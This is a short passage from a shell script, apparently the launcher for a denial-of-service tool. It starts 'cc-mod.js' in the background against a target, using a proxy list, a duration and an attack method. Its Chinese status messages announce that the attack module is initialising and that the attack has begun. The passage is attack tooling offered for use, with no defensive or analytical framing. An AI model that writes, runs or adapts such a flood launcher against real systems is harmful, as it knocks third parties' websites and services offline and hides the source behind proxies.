node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &

echo -e "\033[32m✓ 所有进程已启动！\033[0m"
echo -e "\033[36m════════════════════════════════════════════════════════════\033[0m"
echo ""
echo -e "\033[33m⏳ 正在初始化攻击模块...\033[0m"
sleep 2
echo -e "\033[32m✓ 初始化完成，开始攻击！\033[0m"
echo ""
